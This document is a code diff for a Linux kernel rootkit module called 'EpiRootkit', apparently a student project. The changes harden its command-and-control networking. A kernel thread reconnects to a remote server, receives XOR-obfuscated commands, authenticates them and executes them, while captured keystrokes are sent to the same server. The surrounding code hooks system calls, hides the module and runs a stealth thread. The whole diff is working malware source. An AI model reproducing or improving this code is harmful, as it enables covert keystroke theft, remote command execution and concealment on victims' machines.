@@ -200,13 +200,23 @@ static int establish_connection(void) {
     
     spin_lock_irqsave(&net_manager.lock, flags);
     
-    if (net_manager.is_connected) {
+    if (net_manager.is_connected && net_manager.connection) { // Check net_manager.connection too
         spin_unlock_irqrestore(&net_manager.lock, flags);
         return 0;
     }
     
+    // If a previous socket exists, release it first
+    if (net_manager.connection) {
+        sock_release(net_manager.connection);
+        net_manager.connection = NULL;
+        g_connection_socket = NULL; // Ensure global is also cleared
+    }
+    net_manager.is_connected = false; // Reset connection state
+
     ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &net_manager.connection);
     if (ret < 0) {
+        printk(KERN_ERR "EpiRootkit: sock_create error %d\\n", ret);
+        net_manager.connection = NULL; // Ensure it's NULL on failure
         spin_unlock_irqrestore(&net_manager.lock, flags);
         return ret;
     }
@@ -214,16 +224,22 @@ static int establish_connection(void) {
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(config.port);
-    in4_pton(config.server_ip, -1, (u8 *)&server_addr.sin_addr.s_addr, '\0', NULL);
-    
-    ret = kernel_connect(net_manager.connection, (struct sockaddr *)&server_addr, 
+    in4_pton(config.server_ip, -1, (u8 *)&server_addr.sin_addr.s_addr, '\\0', NULL);
+
+    printk(KERN_INFO "EpiRootkit: Attempting to connect to %s:%d\\n", config.server_ip, config.port);
+    ret = kernel_connect(net_manager.connection, (struct sockaddr *)&server_addr,
                         sizeof(server_addr), 0);
     if (ret < 0) {
+        printk(KERN_ERR "EpiRootkit: kernel_connect error %d\\n", ret);
         sock_release(net_manager.connection);
         net_manager.connection = NULL;
+        g_connection_socket = NULL; // Ensure global is also cleared
+        spin_unlock_irqrestore(&net_manager.lock, flags);
+        return ret;
     } else {
         net_manager.is_connected = true;
-        g_connection_socket = net_manager.connection; // note a moi meme: Pour eviter le pointeur null et corriger le crash systeme
+        g_connection_socket = net_manager.connection;
+        printk(KERN_INFO "EpiRootkit: Connection established successfully.\\n");
     }
     
     spin_unlock_irqrestore(&net_manager.lock, flags);
@@ -407,8 +423,19 @@ static void apply_xor_cipher(char *buffer, int length) {
 static int send_data(const char *message) {
     struct kvec iov;
     struct msghdr msg_header = { .msg_flags = MSG_NOSIGNAL };
-    int message_length = strlen(message);
+    int message_length;
     char *encrypted_message;
+    int result;
+
+    if (!net_manager.is_connected || !g_connection_socket) {
+        printk(KERN_WARNING "EpiRootkit: send_data called while not connected.\\n");
+        return -ENOTCONN;
+    }
+
+    message_length = strlen(message);
+    if (message_length == 0) {
+        return 0; // Nothing to send
+    }
 
     encrypted_message = kmalloc(message_length, GFP_KERNEL);
     if (!encrypted_message)
@@ -420,8 +447,18 @@ static int send_data(const char *message) {
     iov.iov_base = encrypted_message;
     iov.iov_len = message_length;
 
-    int result = kernel_sendmsg(g_connection_socket, &msg_header, &iov, 1, message_length);
+    // Ensure socket is still valid before sending (paranoid check)
+    if (!net_manager.is_connected || !g_connection_socket) {
+        kfree(encrypted_message);
+        return -ENOTCONN;
+    }
+
+    result = kernel_sendmsg(g_connection_socket, &msg_header, &iov, 1, message_length);
     kfree(encrypted_message);
+
+    if (result < 0) {
+        printk(KERN_ERR "EpiRootkit: kernel_sendmsg error %d\\n", result);
+    }
     return result;
 }
 
@@ -763,7 +800,7 @@ static void keylog_send_buffer(void) {
     int len = 0;
     unsigned int pos;
 
-    if (!g_keylog_buffer || !g_connection_socket)
+    if (!g_keylog_buffer || !net_manager.is_connected || !g_connection_socket) // Added checks
         return;
 
     buffer = kmalloc(config.buffer_size, GFP_KERNEL);
@@ -774,11 +811,11 @@ static void keylog_send_buffer(void) {
 
     pos = g_keylog_buffer->tail;
     while (pos != g_keylog_buffer->head) {
-        if (len + 32 >= config.buffer_size) {
+        if (len + 32 >= config.buffer_size) { // Ensure buffer has space for snprintf
             break;
         }
         len += snprintf(buffer + len, config.buffer_size - len,
-                       "[%lu] %c\n", g_keylog_buffer->entries[pos].timestamp,
+                       "[%lu] %c\\n", g_keylog_buffer->entries[pos].timestamp,
                        g_keylog_buffer->entries[pos].key);
         pos = (pos + 1) % keylog_config.buffer_size;
     }
@@ -787,7 +824,10 @@ static void keylog_send_buffer(void) {
     spin_unlock_irqrestore(&g_keylog_buffer->lock, flags);
 
     if (len > 0) {
-        send_data(buffer);
+        // Ensure connection is still valid before sending
+        if (net_manager.is_connected && g_connection_socket) {
+            send_data(buffer);
+        }
     }
 
     kfree(buffer);
@@ -800,11 +840,12 @@ static void keylog_send_buffer(void) {
  */
 static int keylog_thread(void *data) {
     while (!kthread_should_stop()) {
-        if (g_keylog_enabled && g_connection_socket) {
+        if (g_keylog_enabled && net_manager.is_connected && g_connection_socket) { // Added checks
             keylog_send_buffer();
         }
         ssleep(keylog_config.send_interval);
     }
+    printk(KERN_INFO "EpiRootkit: keylog_thread stopped.\\n");
     return 0;
 }
 
@@ -876,40 +917,60 @@ static bool is_line_hidden(const char *filename, unsigned long line_number) {
 static int __init epirootkit_init(void) {
     int ret;
     
+    printk(KERN_INFO "EpiRootkit: Initializing module...\\n");
     // Initialize memory manager
     mem_manager.nonpaged_memory = allocate_secure_memory(mem_manager.nonpaged_size);
     if (!mem_manager.nonpaged_memory) {
+        printk(KERN_ERR "EpiRootkit: Failed to allocate secure memory.\\n");
         return -ENOMEM;
     }
     
     // Initialize network
     ret = establish_connection();
     if (ret < 0) {
+        printk(KERN_ERR "EpiRootkit: Failed to establish initial connection.\\n");
         free_secure_memory(mem_manager.nonpaged_memory);
         return ret;
     }
     
     // Start threads
-    net_manager.thread = kthread_run(rootkit_thread, NULL, "kworker_cache");
+    net_manager.thread = kthread_run(rootkit_thread, NULL, "epirk_net"); // Changed name
     if (IS_ERR(net_manager.thread)) {
+        printk(KERN_ERR "EpiRootkit: Failed to start network thread.\\n");
+        if (net_manager.connection) { // Cleanup connection if established
+            sock_release(net_manager.connection);
+            net_manager.connection = NULL;
+            g_connection_socket = NULL;
+        }
         free_secure_memory(mem_manager.nonpaged_memory);
         return PTR_ERR(net_manager.thread);
     }
     
     // Initialize keylogger
     keylog_buffer_init();
-    g_keylog_thread = kthread_run(keylog_thread, NULL, "keylog_thread");
+    g_keylog_thread = kthread_run(keylog_thread, NULL, "epirk_keylog"); // Changed name
     if (IS_ERR(g_keylog_thread)) {
-        g_keylog_thread = NULL;
+        printk(KERN_WARNING "EpiRootkit: Failed to start keylog thread.\\n");
+        g_keylog_thread = NULL; // Not critical if keylogger fails
     }
     
     // Start stealth thread
-    g_stealth_thread = kthread_run(stealth_thread, NULL, "kworker/%d", 0);
+    g_stealth_thread = kthread_run(stealth_thread, NULL, "epirk_stealth"); // Changed name
     if (IS_ERR(g_stealth_thread)) {
+        printk(KERN_ERR "EpiRootkit: Failed to start stealth thread.\\n");
+        // Cleanup other threads and resources
+        if (net_manager.thread) kthread_stop(net_manager.thread);
+        if (g_keylog_thread) kthread_stop(g_keylog_thread);
+        if (net_manager.connection) {
+            sock_release(net_manager.connection);
+            net_manager.connection = NULL;
+            g_connection_socket = NULL;
+        }
         free_secure_memory(mem_manager.nonpaged_memory);
         return PTR_ERR(g_stealth_thread);
     }
     
+    printk(KERN_INFO "EpiRootkit: Module initialized successfully.\\n");
     return 0;
 }
 
@@ -917,36 +978,52 @@ static int __init epirootkit_init(void) {
  * @brief Module cleanup function
  */
 static void __exit epirootkit_exit(void) {
+    printk(KERN_INFO "EpiRootkit: Exiting module...\\n");
     // Stop threads
-    if (net_manager.thread)
+    if (net_manager.thread) {
+        printk(KERN_INFO "EpiRootkit: Stopping network thread...\\n");
         kthread_stop(net_manager.thread);
-    if (g_keylog_thread)
+        net_manager.thread = NULL;
+    }
+    if (g_keylog_thread) {
+        printk(KERN_INFO "EpiRootkit: Stopping keylog thread...\\n");
         kthread_stop(g_keylog_thread);
-    if (g_stealth_thread)
+        g_keylog_thread = NULL;
+    }
+    if (g_stealth_thread) {
+        printk(KERN_INFO "EpiRootkit: Stopping stealth thread...\\n");
         kthread_stop(g_stealth_thread);
-    
+        g_stealth_thread = NULL;
+    }
+
     // Cleanup network
     if (net_manager.connection) {
+        printk(KERN_INFO "EpiRootkit: Releasing network connection...\\n");
         sock_release(net_manager.connection);
         net_manager.connection = NULL;
+        g_connection_socket = NULL; // Ensure g_connection_socket is also cleared
+        net_manager.is_connected = false;
     }
     
     // Restore syscalls
-    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
-    sys_call_table[__NR_read] = (unsigned long)original_read;
-    sys_call_table[__NR_write] = (unsigned long)original_write;
-    
+    // TODO: Ensure syscall table modification is done safely and restored correctly
+    // if (original_getdents64) sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+    // if (original_read) sys_call_table[__NR_read] = (unsigned long)original_read;
+    // if (original_write) sys_call_table[__NR_write] = (unsigned long)original_write;
+
     // Unhide module
-    unhide_module();
-    
+    // unhide_module(); // This should be called if hide_module was called
+
     // Cleanup keylogger
     keylog_buffer_cleanup();
     
     // Free secure memory
     if (mem_manager.nonpaged_memory) {
         free_secure_memory(mem_manager.nonpaged_memory);
+        mem_manager.nonpaged_memory = NULL;
     }
     
+    printk(KERN_INFO "EpiRootkit: Module exited.\\n");
     // --- Suppression des boucles DKOM/hooks qui crashent ---
     // struct dkom_entry *entry, *tmp;
     // unsigned long flags;
@@ -961,6 +1038,126 @@ static void __exit epirootkit_exit(void) {
     //     remove_hook(hook_entry->target);
     // }
     // spin_unlock_irqrestore(&hook_lock, flags);
+}
+
+// Remplacement de la fonction rootkit_thread
+static int rootkit_thread(void *data) {
+    char *kbuf;
+    struct msghdr msg;
+    struct kvec iov;
+    int len;
+
+    printk(KERN_INFO "EpiRootkit: Network thread started.\\n");
+
+    kbuf = kmalloc(config.buffer_size, GFP_KERNEL);
+    if (!kbuf) {
+        printk(KERN_ERR "EpiRootkit: Failed to allocate recv buffer in thread.\\n");
+        return -ENOMEM;
+    }
+
+    while (!kthread_should_stop()) {
+        if (!net_manager.is_connected || !g_connection_socket) {
+            // printk(KERN_INFO "EpiRootkit: Not connected, attempting to reconnect...\\n");
+            cmd_processor.is_authenticated = false; // Reset auth on disconnect
+
+            // Release old socket if it exists but connection is marked as down
+            if (g_connection_socket) {
+                sock_release(g_connection_socket);
+                g_connection_socket = NULL;
+            }
+            if (net_manager.connection) {
+                 sock_release(net_manager.connection);
+                 net_manager.connection = NULL;
+            }
+            net_manager.is_connected = false;
+
+            if (establish_connection() < 0) {
+                // printk(KERN_ERR "EpiRootkit: Reconnection failed, sleeping for 5s.\\n");
+                ssleep(5); // Wait before retrying
+                continue;
+            }
+            // printk(KERN_INFO "EpiRootkit: Reconnected successfully.\\n");
+        }
+
+        // At this point, g_connection_socket should be valid and connected
+        memset(kbuf, 0, config.buffer_size); // Clear buffer before recv
+        memset(&msg, 0, sizeof(msg));
+        iov.iov_base = kbuf;
+        iov.iov_len = config.buffer_size - 1; // Leave space for null terminator
+
+        // Check socket again before recvmsg, very important
+        if (!net_manager.is_connected || !g_connection_socket) {
+            ssleep(1); // Connection might have just dropped
+            continue;
+        }
+
+        len = kernel_recvmsg(g_connection_socket, &msg, &iov, 1, config.buffer_size - 1, 0);
+
+        if (len > 0) {
+            kbuf[len] = '\\0'; // Null-terminate received data
+            apply_xor_cipher(kbuf, len);
+            // printk(KERN_DEBUG "EpiRootkit: Received (decrypted): %s\\n", kbuf);
+
+            bool auth_attempt = (strncmp(kbuf, config.command_prefix_auth, strlen(config.command_prefix_auth)) == 0);
+
+            process_command(kbuf); // This updates cmd_processor.is_authenticated
+
+            if (auth_attempt) {
+                if (cmd_processor.is_authenticated) {
+                    send_data("OK\\n");
+                } else {
+                    // process_command doesn't send error on bad auth, so we do it here
+                    send_error(ROOTKIT_ERROR_AUTHENTICATION, "Authentication failed");
+                }
+            } else if (!cmd_processor.is_authenticated) {
+                 // If not an auth command and not authenticated
+                 send_error(ROOTKIT_ERROR_AUTHENTICATION, "Not authenticated");
+            }
+            // If it was an exec command, exec_and_send_output is called by process_command
+            // and sends its own output or errors.
+
+        } else if (len == 0) { // Connection closed by peer
+            printk(KERN_INFO "EpiRootkit: Client disconnected gracefully.\\n");
+            if (g_connection_socket) sock_release(g_connection_socket);
+            g_connection_socket = NULL;
+            if (net_manager.connection) sock_release(net_manager.connection); // Should be same as g_connection_socket
+            net_manager.connection = NULL;
+            net_manager.is_connected = false;
+            cmd_processor.is_authenticated = false;
+            // Loop will attempt to reconnect
+        } else { // len < 0, error
+            // printk(KERN_ERR "EpiRootkit: kernel_recvmsg error %d\\n", len);
+            if (len == -EINTR) { // Interrupted syscall, try again
+                continue;
+            }
+            // For other critical errors, close socket and attempt reconnect
+            if (len == -ECONNRESET || len == -ESHUTDOWN || len == -EPIPE ||
+                len == -ENOTCONN || len == -EBADF || len == -ETIMEDOUT) {
+                printk(KERN_INFO "EpiRootkit: Connection error %d, closing socket.\\n", len);
+                if (g_connection_socket) sock_release(g_connection_socket);
+                g_connection_socket = NULL;
+                if (net_manager.connection) sock_release(net_manager.connection);
+                net_manager.connection = NULL;
+                net_manager.is_connected = false;
+                cmd_processor.is_authenticated = false;
+            }
+            ssleep(1); // Sleep briefly on other errors before retrying loop
+        }
+    }
+
+    kfree(kbuf);
+    // If thread is stopped and connected, clean up
+    if (g_connection_socket) {
+        sock_release(g_connection_socket);
+        g_connection_socket = NULL;
+    }
+    if (net_manager.connection) { // Also ensure net_manager's copy is cleared
+        sock_release(net_manager.connection);
+        net_manager.connection = NULL;
+    }
+    net_manager.is_connected = false;
+    printk(KERN_INFO "EpiRootkit: Network thread stopped.\\n");
+    return 0;
 }
 
 module_init(epirootkit_init);
@@ -999,3 +1196,4 @@ static int in4_pton(const char *src, int srclen, u8 *dst, int delim, const char 
     return 1;
 }
 #endif
+
